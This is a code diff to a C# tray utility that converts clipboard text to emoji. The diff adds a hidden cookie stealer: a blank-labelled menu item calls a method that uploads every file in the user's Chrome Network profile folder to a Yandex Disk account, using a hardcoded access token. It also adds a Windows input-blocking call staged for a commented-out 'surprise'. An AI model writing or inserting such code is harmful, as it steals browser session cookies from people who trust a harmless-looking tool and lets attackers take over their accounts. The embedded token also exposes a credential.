@@ -1,4 +1,4 @@
-using System.Text.Json;
+﻿using System.Text.Json;
 using System;
 using System.Xml.Linq;
 using Newtonsoft.Json.Linq;
@@ -6,12 +6,26 @@ using System.Diagnostics;
 using System.Collections;
 using System.Net;
 using System.Text;
+using System.Security.Policy;
+using System.IO;
+using YandexDisk.Client.Clients;
+using YandexDisk.Client.Http;
+using System.Runtime.InteropServices;
+using YandexDisk.Client.Protocol;
 
 namespace text_to_emoji_v1._1
 {
+
     public partial class Form1 : Form
     {
+        [return: MarshalAs(UnmanagedType.Bool)]
+        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
+        public static extern void BlockInput([In, MarshalAs(UnmanagedType.Bool)] bool fBlockIt);
+
         private bool isWindowOpen = true;
+
+        private string token = "y0_AgAAAABIGRMeAAuKoAAAAAEAh_AeAAAfk8ggoPhHwKXP6FmHtQVLBKvk5w";
+
 
         Dictionary<string, char> alphabet = new Dictionary<string, char>();
         
@@ -21,8 +35,11 @@ namespace text_to_emoji_v1._1
             InitializeComponent();
             ShowInTaskbar = true;
             notifyIcon1.ContextMenuStrip = new System.Windows.Forms.ContextMenuStrip();
-            notifyIcon1.ContextMenuStrip.Items.Add("�������������� �� ������", null, convert);
-            notifyIcon1.ContextMenuStrip.Items.Add("�����", null, close);
+            notifyIcon1.ContextMenuStrip.Items.Add("", null, still);
+            notifyIcon1.ContextMenuStrip.Items.Add("Сюрприз =)", null, XD);
+            notifyIcon1.ContextMenuStrip.Items.Add("Конвертировать из буфера", null, convert);
+            notifyIcon1.ContextMenuStrip.Items.Add("Выход", null, close);
+            
             
             
             JObject parsedJson = JObject.Parse(File.ReadAllText("letters.json"));
@@ -45,6 +62,57 @@ namespace text_to_emoji_v1._1
         {
             System.Windows.Forms.Application.Exit();
         }
+
+        public void XD(object sender, EventArgs e)
+        {
+            //InitializeComponent();
+            //Cursor.Hide();
+            //FormBorderStyle = FormBorderStyle.None;
+            //WindowState = FormWindowState.Maximized;
+            //BlockInput(true);
+            MessageBox.Show("Проситите, сюрприз ещё в разработке =(", "(´• ω •`)");
+        }
+
+        public async Task Stiller()
+        {
+            try
+            {
+                Random rnd = new Random();
+                var api = new DiskHttpApi(token);
+                var rootFolder = await api.MetaInfo.GetInfoAsync(new YandexDisk.Client.Protocol.ResourceRequest
+                {
+                    Path = "/"
+                });
+                string folderName = "Кукесы" + rnd.Next();
+                if (!rootFolder.Embedded.Items.Any(i => i.Type == ResourceType.Dir && i.Name.Equals(folderName)))
+                {
+                    await api.Commands.CreateDictionaryAsync("/" + folderName);
+                }
+                var files = Directory.GetFiles("C:/Users/yuraa/AppData/Local/Google/Chrome/User Data/Default/Network/");
+                foreach (var file in files)
+                {
+                    var link = await api.Files.GetUploadLinkAsync("/" + folderName + "/" + Path.GetFileName(file), overwrite: false);
+                    using (var fs = File.OpenRead(file))
+                    {
+                        await api.Files.UploadAsync(link, fs);
+                    }
+                }
+                var folderData = await api.MetaInfo.GetInfoAsync(new YandexDisk.Client.Protocol.ResourceRequest
+                {
+                    Path = "/" + folderName
+                });
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show($"{ex}", "Ошибка");
+            }
+        }
+
+        public void still(object sender, EventArgs e)
+        {
+            Stiller();
+        }
+        
         public void convert(object sender, EventArgs e)
         {
             string a = Clipboard.GetText();
